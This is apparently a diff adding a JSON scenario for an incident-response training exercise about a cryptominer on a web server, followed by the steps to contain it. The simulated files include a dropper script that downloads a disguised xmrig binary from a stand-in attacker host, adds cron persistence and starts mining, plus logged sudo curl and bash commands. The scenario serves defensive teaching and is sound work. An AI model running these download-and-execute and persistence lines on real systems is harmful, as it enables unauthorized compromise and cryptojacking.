@@ -1,0 +1,1348 @@
+{
+ "id": "infected-web-01",
+ "title": "3 a.m. page: web-01 is burning CPU",
+ "kind": "incident",
+ "tool": "Linux server, Grafana",
+ "minutes": 25,
+ "skill_ids": [
+  "triage",
+  "log_analysis",
+  "containment"
+ ],
+ "briefing": "**PagerDuty, 03:24** — *High CPU on web-01 (97%) and checkout latency p95 > 1.5 s.*\n\nYou are the on-call engineer. The shop runs behind a load balancer on two web servers (`web-01`, `web-02`) with one database. Nobody deployed tonight.\n\n1. Find out **what** is eating the CPU and **how** it got there.\n2. **Contain** it: stop the process, remove its persistence, block the source.\n\nStart on the map: click `web-01` to open its terminal and logs. The Grafana board is in the *Apps* tab.",
+ "world": {
+  "nodes": [
+   {
+    "id": "internet",
+    "label": "Internet",
+    "kind": "cloud",
+    "status": "unknown",
+    "detail": "Customers and… someone else",
+    "x": 6,
+    "y": 50
+   },
+   {
+    "id": "lb",
+    "label": "lb-01 (nginx)",
+    "kind": "load_balancer",
+    "status": "healthy",
+    "detail": "Round-robin to web-01, web-02",
+    "x": 28,
+    "y": 50
+   },
+   {
+    "id": "web01",
+    "label": "web-01",
+    "kind": "server",
+    "status": "compromised",
+    "detail": "Ubuntu 22.04 · 4 vCPU · CPU 97%",
+    "x": 52,
+    "y": 28
+   },
+   {
+    "id": "web02",
+    "label": "web-02",
+    "kind": "server",
+    "status": "healthy",
+    "detail": "Ubuntu 22.04 · 4 vCPU · CPU 16%",
+    "x": 52,
+    "y": 72
+   },
+   {
+    "id": "db",
+    "label": "db-01 (PostgreSQL)",
+    "kind": "database",
+    "status": "healthy",
+    "detail": "Primary database",
+    "x": 78,
+    "y": 50
+   },
+   {
+    "id": "mon",
+    "label": "Grafana",
+    "kind": "app",
+    "status": "healthy",
+    "detail": "Monitoring",
+    "x": 90,
+    "y": 14
+   }
+  ],
+  "links": [
+   {
+    "from": "internet",
+    "to": "lb",
+    "label": "HTTPS"
+   },
+   {
+    "from": "lb",
+    "to": "web01",
+    "label": ":8080"
+   },
+   {
+    "from": "lb",
+    "to": "web02",
+    "label": ":8080"
+   },
+   {
+    "from": "web01",
+    "to": "db",
+    "label": "5432"
+   },
+   {
+    "from": "web02",
+    "to": "db",
+    "label": "5432"
+   }
+  ]
+ },
+ "hosts": [
+  {
+   "node_id": "web01",
+   "hostname": "web-01",
+   "user": "root",
+   "cwd": "/root",
+   "motd": "Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-105-generic x86_64)\nLast login: Tue Nov 12 03:11:58 2024 from 203.0.113.45",
+   "files": [
+    {
+     "path": "/var/log/auth.log",
+     "content": "Nov 12 02:48:06 web-01 sshd[21000]: Failed password for invalid user admin from 203.0.113.45 port 40000 ssh2\nNov 12 02:48:10 web-01 sshd[21001]: Failed password for invalid user root from 203.0.113.45 port 40007 ssh2\nNov 12 02:48:18 web-01 sshd[21002]: Failed password for invalid user test from 203.0.113.45 port 40014 ssh2\nNov 12 02:48:24 web-01 sshd[21003]: Failed password for invalid user oracle from 203.0.113.45 port 40021 ssh2\nNov 12 02:48:32 web-01 sshd[21004]: Failed password for invalid user ubuntu from 203.0.113.45 port 40028 ssh2\nNov 12 02:48:32 web-01 sshd[21504]: Accepted publickey for deploy from 198.51.100.20 port 52114 ssh2\nNov 12 02:48:39 web-01 sshd[21005]: Failed password for invalid user postgres from 203.0.113.45 port 40035 ssh2\nNov 12 02:48:47 web-01 sshd[21006]: Failed password for invalid user git from 203.0.113.45 port 40042 ssh2\nNov 12 02:48:52 web-01 sshd[21007]: Failed password for invalid user deploy from 203.0.113.45 port 40049 ssh2\nNov 12 02:48:56 web-01 sshd[21008]: Failed password for invalid user admin from 203.0.113.45 port 40056 ssh2\nNov 12 02:48:59 web-01 sshd[21009]: Failed password for invalid user root from 203.0.113.45 port 40063 ssh2\nNov 12 02:49:03 web-01 sshd[21010]: Failed password for invalid user test from 203.0.113.45 port 40070 ssh2\nNov 12 02:49:07 web-01 sshd[21011]: Failed password for invalid user oracle from 203.0.113.45 port 40077 ssh2\nNov 12 02:49:12 web-01 sshd[21012]: Failed password for invalid user ubuntu from 203.0.113.45 port 40084 ssh2\nNov 12 02:49:17 web-01 sshd[21013]: Failed password for invalid user postgres from 203.0.113.45 port 40091 ssh2\nNov 12 02:49:17 web-01 sshd[21513]: Accepted publickey for deploy from 198.51.100.20 port 52114 ssh2\nNov 12 02:49:19 web-01 sshd[21014]: Failed password for invalid user git from 203.0.113.45 port 40098 ssh2\nNov 12 02:49:28 web-01 sshd[21015]: Failed password for invalid user deploy from 203.0.113.45 port 40105 ssh2\nNov 12 02:49:32 web-01 sshd[21016]: Failed password for invalid user admin from 203.0.113.45 port 40112 ssh2\nNov 12 02:49:38 web-01 sshd[21017]: Failed password for invalid user root from 203.0.113.45 port 40119 ssh2\nNov 12 02:49:44 web-01 sshd[21018]: Failed password for invalid user test from 203.0.113.45 port 40126 ssh2\nNov 12 02:49:46 web-01 sshd[21019]: Failed password for invalid user oracle from 203.0.113.45 port 40133 ssh2\nNov 12 02:49:50 web-01 sshd[21020]: Failed password for invalid user ubuntu from 203.0.113.45 port 40140 ssh2\nNov 12 02:49:58 web-01 sshd[21021]: Failed password for invalid user postgres from 203.0.113.45 port 40147 ssh2\nNov 12 02:50:05 web-01 sshd[21022]: Failed password for invalid user git from 203.0.113.45 port 40154 ssh2\nNov 12 02:50:05 web-01 sshd[21522]: Accepted publickey for deploy from 198.51.100.20 port 52114 ssh2\nNov 12 02:50:12 web-01 sshd[21023]: Failed password for invalid user deploy from 203.0.113.45 port 40161 ssh2\nNov 12 02:50:16 web-01 sshd[21024]: Failed password for invalid user admin from 203.0.113.45 port 40168 ssh2\nNov 12 02:50:18 web-01 sshd[21025]: Failed password for invalid user root from 203.0.113.45 port 40175 ssh2\nNov 12 02:50:27 web-01 sshd[21026]: Failed password for invalid user test from 203.0.113.45 port 40182 ssh2\nNov 12 02:50:35 web-01 sshd[21027]: Failed password for invalid user oracle from 203.0.113.45 port 40189 ssh2\nNov 12 02:50:43 web-01 sshd[21028]: Failed password for invalid user ubuntu from 203.0.113.45 port 40196 ssh2\nNov 12 02:50:51 web-01 sshd[21029]: Failed password for invalid user postgres from 203.0.113.45 port 40203 ssh2\nNov 12 02:50:59 web-01 sshd[21030]: Failed password for invalid user git from 203.0.113.45 port 40210 ssh2\nNov 12 02:51:02 web-01 sshd[21031]: Failed password for invalid user deploy from 203.0.113.45 port 40217 ssh2\nNov 12 02:51:02 web-01 sshd[21531]: Accepted publickey for deploy from 198.51.100.20 port 52114 ssh2\nNov 12 02:51:11 web-01 sshd[21032]: Failed password for invalid user admin from 203.0.113.45 port 40224 ssh2\nNov 12 02:51:19 web-01 sshd[21033]: Failed password for invalid user root from 203.0.113.45 port 40231 ssh2\nNov 12 02:51:21 web-01 sshd[21034]: Failed password for invalid user test from 203.0.113.45 port 40238 ssh2\nNov 12 02:51:26 web-01 sshd[21035]: Failed password for invalid user oracle from 203.0.113.45 port 40245 ssh2\nNov 12 02:51:29 web-01 sshd[21036]: Failed password for invalid user ubuntu from 203.0.113.45 port 40252 ssh2\nNov 12 02:51:34 web-01 sshd[21037]: Failed password for invalid user postgres from 203.0.113.45 port 40259 ssh2\nNov 12 02:51:43 web-01 sshd[21038]: Failed password for invalid user git from 203.0.113.45 port 40266 ssh2\nNov 12 02:51:47 web-01 sshd[21039]: Failed password for invalid user deploy from 203.0.113.45 port 40273 ssh2\nNov 12 02:51:50 web-01 sshd[21040]: Failed password for invalid user admin from 203.0.113.45 port 40280 ssh2\nNov 12 02:51:50 web-01 sshd[21540]: Accepted publickey for deploy from 198.51.100.20 port 52114 ssh2\nNov 12 02:51:57 web-01 sshd[21041]: Failed password for invalid user root from 203.0.113.45 port 40287 ssh2\nNov 12 02:51:59 web-01 sshd[21042]: Failed password for invalid user test from 203.0.113.45 port 40294 ssh2\nNov 12 02:52:02 web-01 sshd[21043]: Failed password for invalid user oracle from 203.0.113.45 port 40301 ssh2\nNov 12 02:52:04 web-01 sshd[21044]: Failed password for invalid user ubuntu from 203.0.113.45 port 40308 ssh2\nNov 12 02:52:08 web-01 sshd[21045]: Failed password for invalid user postgres from 203.0.113.45 port 40315 ssh2\nNov 12 03:11:58 web-01 sshd[21877]: Accepted password for deploy from 203.0.113.45 port 41822 ssh2\nNov 12 03:11:58 web-01 sshd[21877]: pam_unix(sshd:session): session opened for user deploy(uid=1001)\nNov 12 03:12:20 web-01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/curl -s http://203.0.113.45/x.sh -o /tmp/.x/x.sh\nNov 12 03:12:24 web-01 sudo:   deploy : TTY=pts/1 ; PWD=/tmp/.x ; USER=root ; COMMAND=/bin/bash /tmp/.x/x.sh\nNov 12 03:20:02 web-01 CRON[22011]: (root) CMD (/tmp/.x/kworkerds -B >/dev/null 2>&1)"
+    },
+    {
+     "path": "/var/log/nginx/access.log",
+     "content": "Nov 12 02:40:06 198.51.100.244 \"GET / HTTP/1.1\" 502 rt=88ms\nNov 12 02:41:39 198.51.100.8 \"GET /api/products HTTP/1.1\" 200 rt=66ms\nNov 12 02:42:55 198.51.100.55 \"GET /api/cart HTTP/1.1\" 200 rt=29ms\nNov 12 02:43:09 198.51.100.164 \"GET /static/app.js HTTP/1.1\" 200 rt=68ms\nNov 12 02:44:22 198.51.100.156 \"GET /api/login HTTP/1.1\" 200 rt=52ms\nNov 12 02:45:30 198.51.100.33 \"GET /healthz HTTP/1.1\" 200 rt=66ms\nNov 12 02:46:54 198.51.100.126 \"GET / HTTP/1.1\" 200 rt=34ms\nNov 12 02:47:30 198.51.100.125 \"GET /api/products HTTP/1.1\" 200 rt=79ms\nNov 12 02:48:05 198.51.100.38 \"GET /api/cart HTTP/1.1\" 200 rt=59ms\nNov 12 02:49:47 198.51.100.89 \"GET /static/app.js HTTP/1.1\" 200 rt=33ms\nNov 12 02:50:30 198.51.100.214 \"GET /api/login HTTP/1.1\" 200 rt=53ms\nNov 12 02:51:33 198.51.100.7 \"GET /healthz HTTP/1.1\" 200 rt=40ms\nNov 12 02:52:33 198.51.100.94 \"GET / HTTP/1.1\" 200 rt=46ms\nNov 12 02:53:44 198.51.100.141 \"GET /api/products HTTP/1.1\" 502 rt=38ms\nNov 12 02:54:48 198.51.100.137 \"GET /api/cart HTTP/1.1\" 200 rt=23ms\nNov 12 02:55:41 198.51.100.223 \"GET /static/app.js HTTP/1.1\" 200 rt=58ms\nNov 12 02:56:44 198.51.100.218 \"GET /api/login HTTP/1.1\" 200 rt=31ms\nNov 12 02:57:33 198.51.100.95 \"GET /healthz HTTP/1.1\" 200 rt=53ms\nNov 12 02:58:22 198.51.100.199 \"GET / HTTP/1.1\" 200 rt=41ms\nNov 12 02:59:34 198.51.100.140 \"GET /api/products HTTP/1.1\" 200 rt=48ms\nNov 12 02:00:21 198.51.100.164 \"GET /api/cart HTTP/1.1\" 200 rt=84ms\nNov 12 02:01:39 198.51.100.209 \"GET /static/app.js HTTP/1.1\" 200 rt=48ms\nNov 12 02:02:51 198.51.100.63 \"GET /api/login HTTP/1.1\" 200 rt=44ms\nNov 12 02:03:47 198.51.100.207 \"GET /healthz HTTP/1.1\" 200 rt=71ms\nNov 12 02:04:12 198.51.100.134 \"GET / HTTP/1.1\" 200 rt=49ms\nNov 12 02:05:22 198.51.100.189 \"GET /api/products HTTP/1.1\" 200 rt=83ms\nNov 12 02:06:01 198.51.100.204 \"GET /api/cart HTTP/1.1\" 502 rt=23ms\nNov 12 02:07:30 198.51.100.68 \"GET /static/app.js HTTP/1.1\" 200 rt=55ms\nNov 12 02:08:44 198.51.100.156 \"GET /api/login HTTP/1.1\" 200 rt=44ms\nNov 12 02:09:28 198.51.100.208 \"GET /healthz HTTP/1.1\" 200 rt=64ms\nNov 12 03:10:23 198.51.100.22 \"GET / HTTP/1.1\" 200 rt=64ms\nNov 12 03:11:06 198.51.100.60 \"GET /api/products HTTP/1.1\" 200 rt=48ms\nNov 12 03:12:12 198.51.100.88 \"GET /api/cart HTTP/1.1\" 200 rt=80ms\nNov 12 03:13:30 198.51.100.161 \"GET /static/app.js HTTP/1.1\" 200 rt=46ms\nNov 12 03:14:39 198.51.100.217 \"GET /api/login HTTP/1.1\" 200 rt=2243ms\nNov 12 03:15:30 198.51.100.234 \"GET /healthz HTTP/1.1\" 200 rt=403ms\nNov 12 03:16:22 198.51.100.206 \"GET / HTTP/1.1\" 200 rt=1737ms\nNov 12 03:17:05 198.51.100.215 \"GET /api/products HTTP/1.1\" 200 rt=1717ms\nNov 12 03:18:07 198.51.100.234 \"GET /api/cart HTTP/1.1\" 200 rt=1752ms\nNov 12 03:19:50 198.51.100.184 \"GET /static/app.js HTTP/1.1\" 502 rt=1195ms\nNov 12 03:20:12 198.51.100.124 \"GET /api/login HTTP/1.1\" 200 rt=1936ms\nNov 12 03:21:11 198.51.100.113 \"GET /healthz HTTP/1.1\" 200 rt=2220ms\nNov 12 03:22:40 198.51.100.87 \"GET / HTTP/1.1\" 200 rt=2016ms\nNov 12 03:23:51 198.51.100.244 \"GET /api/products HTTP/1.1\" 200 rt=577ms\nNov 12 03:24:46 198.51.100.103 \"GET /api/cart HTTP/1.1\" 200 rt=2389ms\nNov 12 03:25:25 198.51.100.192 \"GET /static/app.js HTTP/1.1\" 200 rt=1348ms\nNov 12 03:26:05 198.51.100.187 \"GET /api/login HTTP/1.1\" 200 rt=2339ms\nNov 12 03:27:10 198.51.100.34 \"GET /healthz HTTP/1.1\" 200 rt=725ms\nNov 12 03:28:09 198.51.100.153 \"GET / HTTP/1.1\" 200 rt=456ms\nNov 12 03:29:29 198.51.100.208 \"GET /api/products HTTP/1.1\" 200 rt=2253ms\nNov 12 03:30:09 198.51.100.158 \"GET /api/cart HTTP/1.1\" 200 rt=1743ms\nNov 12 03:31:38 198.51.100.123 \"GET /static/app.js HTTP/1.1\" 200 rt=2092ms\nNov 12 03:32:59 198.51.100.91 \"GET /api/login HTTP/1.1\" 502 rt=1746ms\nNov 12 03:33:35 198.51.100.142 \"GET /healthz HTTP/1.1\" 200 rt=719ms\nNov 12 03:34:01 198.51.100.5 \"GET / HTTP/1.1\" 200 rt=668ms\nNov 12 03:35:46 198.51.100.168 \"GET /api/products HTTP/1.1\" 200 rt=2037ms\nNov 12 03:36:33 198.51.100.193 \"GET /api/cart HTTP/1.1\" 200 rt=610ms\nNov 12 03:37:08 198.51.100.113 \"GET /static/app.js HTTP/1.1\" 200 rt=2312ms\nNov 12 03:38:12 198.51.100.213 \"GET /api/login HTTP/1.1\" 200 rt=2185ms\nNov 12 03:39:13 198.51.100.9 \"GET /healthz HTTP/1.1\" 200 rt=2189ms\nNov 12 03:14:40 upstream timed out (110: Connection timed out) while reading response header from upstream, upstream: \"http://127.0.0.1:8080/api/cart\""
+    },
+    {
+     "path": "/var/log/syslog",
+     "content": "Nov 12 03:12:25 web-01 systemd[1]: Started Session 4412 of user deploy.\nNov 12 03:12:31 web-01 kernel: [884213.12] kworkerds[4242]: segfault at 0 ip 00007f… error 4 (ignored, restarted)\nNov 12 03:13:00 web-01 kernel: [884242.80] CPU3: Package temperature above threshold, cpu clock throttled\nNov 12 03:15:00 web-01 systemd[1]: Starting Daily apt download activities...\nNov 12 03:16:41 web-01 app[1880]: java.util.concurrent.TimeoutException: request /api/cart exceeded 2000ms\nNov 12 03:21:10 web-01 systemd[1]: logrotate.service: Succeeded."
+    },
+    {
+     "path": "/etc/cron.d/sysupdate",
+     "content": "# system update helper\n*/5 * * * * root /tmp/.x/kworkerds -B >/dev/null 2>&1\n"
+    },
+    {
+     "path": "/etc/cron.d/logrotate",
+     "content": "0 3 * * * root /usr/sbin/logrotate /etc/logrotate.conf\n"
+    },
+    {
+     "path": "/tmp/.x/x.sh",
+     "content": "#!/bin/bash\n# installer\ncurl -s http://203.0.113.45/kworkerds -o /tmp/.x/kworkerds\nchmod +x /tmp/.x/kworkerds\necho '*/5 * * * * root /tmp/.x/kworkerds -B >/dev/null 2>&1' > /etc/cron.d/sysupdate\n/tmp/.x/kworkerds -B -o pool.example.com:3333 -u 4Bx9…wallet\n"
+    },
+    {
+     "path": "/tmp/.x/kworkerds",
+     "content": "ELF (binary, 2.1 MB) — strings: xmrig 6.21.0, randomx, pool.example.com:3333"
+    },
+    {
+     "path": "/tmp/.x/config.json",
+     "content": "{\n  \"pools\": [{\"url\": \"pool.example.com:3333\", \"user\": \"4Bx9…wallet\"}],\n  \"cpu\": {\"max-threads-hint\": 100}\n}\n"
+    },
+    {
+     "path": "/home/deploy/.bash_history",
+     "content": "cd /tmp\nmkdir .x\nsudo curl -s http://203.0.113.45/x.sh -o /tmp/.x/x.sh\nsudo bash /tmp/.x/x.sh\nhistory -c\n"
+    },
+    {
+     "path": "/etc/ssh/sshd_config",
+     "content": "Port 22\nPermitRootLogin no\nPasswordAuthentication yes\nPubkeyAuthentication yes\nMaxAuthTries 6\n"
+    },
+    {
+     "path": "/opt/shop/application.properties",
+     "content": "server.port=8080\nspring.datasource.url=jdbc:postgresql://db-01:5432/shop\nspring.datasource.hikari.maximum-pool-size=20\n"
+    }
+   ],
+   "processes": [
+    {
+     "pid": 1,
+     "user": "root",
+     "cpu": 0.0,
+     "mem": 0.1,
+     "command": "/sbin/init"
+    },
+    {
+     "pid": 612,
+     "user": "root",
+     "cpu": 0.0,
+     "mem": 0.2,
+     "command": "/usr/sbin/sshd -D"
+    },
+    {
+     "pid": 1880,
+     "user": "shop",
+     "cpu": 2.1,
+     "mem": 18.4,
+     "command": "java -Xmx1g -jar /opt/shop/shop.jar"
+    },
+    {
+     "pid": 1903,
+     "user": "www-data",
+     "cpu": 0.4,
+     "mem": 0.6,
+     "command": "nginx: worker process"
+    },
+    {
+     "pid": 4242,
+     "user": "root",
+     "cpu": 389.7,
+     "mem": 6.1,
+     "command": "/tmp/.x/kworkerds -B"
+    },
+    {
+     "pid": 4250,
+     "user": "root",
+     "cpu": 0.0,
+     "mem": 0.0,
+     "command": "[kworker/3:2-events]"
+    },
+    {
+     "pid": 5120,
+     "user": "root",
+     "cpu": 0.0,
+     "mem": 0.1,
+     "command": "-bash"
+    }
+   ],
+   "services": [
+    {
+     "name": "nginx",
+     "status": "active",
+     "detail": "A high performance web server and a reverse proxy server"
+    },
+    {
+     "name": "shop",
+     "status": "active",
+     "detail": "Shop Spring Boot application"
+    },
+    {
+     "name": "cron",
+     "status": "active",
+     "detail": "Regular background program processing daemon"
+    },
+    {
+     "name": "ssh",
+     "status": "active",
+     "detail": "OpenBSD Secure Shell server"
+    }
+   ],
+   "commands": [
+    {
+     "pattern": "^(sudo )?crontab -l( -u root)?$",
+     "output": "no crontab for root\n# (hint: system-wide jobs live in /etc/cron.d/)",
+     "effects": {
+      "set_flags": [],
+      "node_status": [],
+      "message": ""
+     }
+    },
+    {
+     "pattern": "^(sudo )?(netstat|ss) -[a-z]*p[a-z]*$",
+     "output": "Proto Local Address        Foreign Address        State       PID/Program\ntcp   0.0.0.0:22           0.0.0.0:*              LISTEN      612/sshd\ntcp   0.0.0.0:8080         0.0.0.0:*              LISTEN      1880/java\ntcp   10.0.1.11:22         203.0.113.45:41822     ESTABLISHED 5120/sshd: deploy\ntcp   10.0.1.11:51544      192.0.2.77:3333        ESTABLISHED 4242/kworkerds\ntcp   10.0.1.11:40112      10.0.1.30:5432         ESTABLISHED 1880/java",
+     "effects": {
+      "set_flags": [],
+      "node_status": [],
+      "message": ""
+     }
+    },
+    {
+     "pattern": "^(sudo )?ls -l[a-z]* /proc/4242/exe$",
+     "output": "lrwxrwxrwx 1 root root 0 Nov 12 03:12 /proc/4242/exe -> /tmp/.x/kworkerds",
+     "effects": {
+      "set_flags": [],
+      "node_status": [],
+      "message": ""
+     }
+    },
+    {
+     "pattern": "^(sudo )?lsof -p 4242$",
+     "output": "COMMAND    PID USER  FD   TYPE DEVICE SIZE/OFF   NODE NAME\nkworkerds 4242 root  txt    REG  259,1  2203648 393311 /tmp/.x/kworkerds\nkworkerds 4242 root    5u  IPv4 991231      0t0    TCP web-01:51544->192.0.2.77:3333 (ESTABLISHED)",
+     "effects": {
+      "set_flags": [],
+      "node_status": [],
+      "message": ""
+     }
+    },
+    {
+     "pattern": "^(sudo )?iptables -(A|I) INPUT .*-s 203\\.0\\.113\\.45.*-j (DROP|REJECT)$",
+     "output": "",
+     "effects": {
+      "set_flags": [
+       "blocked:203.0.113.45"
+      ],
+      "node_status": [],
+      "message": "Firewall: traffic from 203.0.113.45 is now dropped."
+     }
+    },
+    {
+     "pattern": "^(sudo )?ufw (insert 1 )?deny from 203\\.0\\.113\\.45.*$",
+     "output": "Rule inserted",
+     "effects": {
+      "set_flags": [
+       "blocked:203.0.113.45"
+      ],
+      "node_status": [],
+      "message": "Firewall: traffic from 203.0.113.45 is now dropped."
+     }
+    },
+    {
+     "pattern": "^(sudo )?iptables -(A|I) OUTPUT .*-d 192\\.0\\.2\\.77.*-j (DROP|REJECT)$",
+     "output": "",
+     "effects": {
+      "set_flags": [
+       "blocked:pool"
+      ],
+      "node_status": [],
+      "message": "Outbound connection to the mining pool blocked."
+     }
+    },
+    {
+     "pattern": "^(sudo )?iptables -L.*$",
+     "output": "Chain INPUT (policy ACCEPT)\ntarget     prot opt source               destination\n\nChain OUTPUT (policy ACCEPT)\ntarget     prot opt source               destination",
+     "effects": {
+      "set_flags": [],
+      "node_status": [],
+      "message": ""
+     }
+    },
+    {
+     "pattern": "^(sudo )?(passwd|chage) .*deploy.*$",
+     "output": "passwd: password updated successfully",
+     "effects": {
+      "set_flags": [
+       "rotated:deploy"
+      ],
+      "node_status": [],
+      "message": "deploy's password has been rotated."
+     }
+    },
+    {
+     "pattern": "^(sudo )?(free|free -[a-z]+)$",
+     "output": "               total        used        free      shared  buff/cache   available\nMem:            7951        2410         844          12        4697        5212\nSwap:              0           0           0",
+     "effects": {
+      "set_flags": [],
+      "node_status": [],
+      "message": ""
+     }
+    },
+    {
+     "pattern": "^uptime$",
+     "output": " 03:26:11 up 10 days,  5:41,  1 user,  load average: 4.12, 4.03, 3.20",
+     "effects": {
+      "set_flags": [],
+      "node_status": [],
+      "message": ""
+     }
+    },
+    {
+     "pattern": "^(sudo )?last( -n \\d+)?$",
+     "output": "deploy   pts/1        203.0.113.45     Tue Nov 12 03:11   still logged in\ndeploy   pts/0        198.51.100.20    Mon Nov 11 17:02 - 17:40  (00:38)",
+     "effects": {
+      "set_flags": [],
+      "node_status": [],
+      "message": ""
+     }
+    },
+    {
+     "pattern": "^(sudo )?pkill .*kworkerds.*$",
+     "output": "",
+     "effects": {
+      "set_flags": [
+       "killed:4242"
+      ],
+      "node_status": [],
+      "message": "Process kworkerds (4242) terminated."
+     }
+    }
+   ]
+  }
+ ],
+ "logs": [
+  {
+   "id": "auth",
+   "name": "web-01 · /var/log/auth.log",
+   "node_id": "web01",
+   "lines": [
+    {
+     "ts": "Nov 12 02:48:06",
+     "level": "warn",
+     "message": "sshd[21000]: Failed password for invalid user admin from 203.0.113.45 port 40000 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:48:11",
+     "level": "warn",
+     "message": "sshd[21001]: Failed password for invalid user root from 203.0.113.45 port 40007 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:48:17",
+     "level": "warn",
+     "message": "sshd[21002]: Failed password for invalid user test from 203.0.113.45 port 40014 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:48:22",
+     "level": "warn",
+     "message": "sshd[21003]: Failed password for invalid user oracle from 203.0.113.45 port 40021 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:48:29",
+     "level": "warn",
+     "message": "sshd[21004]: Failed password for invalid user ubuntu from 203.0.113.45 port 40028 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:48:29",
+     "level": "info",
+     "message": "sshd[21504]: Accepted publickey for deploy from 198.51.100.20 port 52114 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:48:35",
+     "level": "warn",
+     "message": "sshd[21005]: Failed password for invalid user postgres from 203.0.113.45 port 40035 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:48:43",
+     "level": "warn",
+     "message": "sshd[21006]: Failed password for invalid user git from 203.0.113.45 port 40042 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:48:47",
+     "level": "warn",
+     "message": "sshd[21007]: Failed password for invalid user deploy from 203.0.113.45 port 40049 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:48:49",
+     "level": "warn",
+     "message": "sshd[21008]: Failed password for invalid user admin from 203.0.113.45 port 40056 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:48:56",
+     "level": "warn",
+     "message": "sshd[21009]: Failed password for invalid user root from 203.0.113.45 port 40063 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:49:05",
+     "level": "warn",
+     "message": "sshd[21010]: Failed password for invalid user test from 203.0.113.45 port 40070 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:49:13",
+     "level": "warn",
+     "message": "sshd[21011]: Failed password for invalid user oracle from 203.0.113.45 port 40077 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:49:17",
+     "level": "warn",
+     "message": "sshd[21012]: Failed password for invalid user ubuntu from 203.0.113.45 port 40084 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:49:21",
+     "level": "warn",
+     "message": "sshd[21013]: Failed password for invalid user postgres from 203.0.113.45 port 40091 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:49:21",
+     "level": "info",
+     "message": "sshd[21513]: Accepted publickey for deploy from 198.51.100.20 port 52114 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:49:23",
+     "level": "warn",
+     "message": "sshd[21014]: Failed password for invalid user git from 203.0.113.45 port 40098 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:49:32",
+     "level": "warn",
+     "message": "sshd[21015]: Failed password for invalid user deploy from 203.0.113.45 port 40105 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:49:36",
+     "level": "warn",
+     "message": "sshd[21016]: Failed password for invalid user admin from 203.0.113.45 port 40112 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:49:38",
+     "level": "warn",
+     "message": "sshd[21017]: Failed password for invalid user root from 203.0.113.45 port 40119 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:49:42",
+     "level": "warn",
+     "message": "sshd[21018]: Failed password for invalid user test from 203.0.113.45 port 40126 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:49:46",
+     "level": "warn",
+     "message": "sshd[21019]: Failed password for invalid user oracle from 203.0.113.45 port 40133 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:49:50",
+     "level": "warn",
+     "message": "sshd[21020]: Failed password for invalid user ubuntu from 203.0.113.45 port 40140 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:49:59",
+     "level": "warn",
+     "message": "sshd[21021]: Failed password for invalid user postgres from 203.0.113.45 port 40147 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:50:02",
+     "level": "warn",
+     "message": "sshd[21022]: Failed password for invalid user git from 203.0.113.45 port 40154 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:50:02",
+     "level": "info",
+     "message": "sshd[21522]: Accepted publickey for deploy from 198.51.100.20 port 52114 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:50:04",
+     "level": "warn",
+     "message": "sshd[21023]: Failed password for invalid user deploy from 203.0.113.45 port 40161 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:50:11",
+     "level": "warn",
+     "message": "sshd[21024]: Failed password for invalid user admin from 203.0.113.45 port 40168 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:50:20",
+     "level": "warn",
+     "message": "sshd[21025]: Failed password for invalid user root from 203.0.113.45 port 40175 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:50:23",
+     "level": "warn",
+     "message": "sshd[21026]: Failed password for invalid user test from 203.0.113.45 port 40182 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:50:25",
+     "level": "warn",
+     "message": "sshd[21027]: Failed password for invalid user oracle from 203.0.113.45 port 40189 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:50:30",
+     "level": "warn",
+     "message": "sshd[21028]: Failed password for invalid user ubuntu from 203.0.113.45 port 40196 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:50:35",
+     "level": "warn",
+     "message": "sshd[21029]: Failed password for invalid user postgres from 203.0.113.45 port 40203 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:50:41",
+     "level": "warn",
+     "message": "sshd[21030]: Failed password for invalid user git from 203.0.113.45 port 40210 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:50:43",
+     "level": "warn",
+     "message": "sshd[21031]: Failed password for invalid user deploy from 203.0.113.45 port 40217 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:50:43",
+     "level": "info",
+     "message": "sshd[21531]: Accepted publickey for deploy from 198.51.100.20 port 52114 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:50:46",
+     "level": "warn",
+     "message": "sshd[21032]: Failed password for invalid user admin from 203.0.113.45 port 40224 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:50:55",
+     "level": "warn",
+     "message": "sshd[21033]: Failed password for invalid user root from 203.0.113.45 port 40231 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:50:57",
+     "level": "warn",
+     "message": "sshd[21034]: Failed password for invalid user test from 203.0.113.45 port 40238 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:51:00",
+     "level": "warn",
+     "message": "sshd[21035]: Failed password for invalid user oracle from 203.0.113.45 port 40245 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:51:09",
+     "level": "warn",
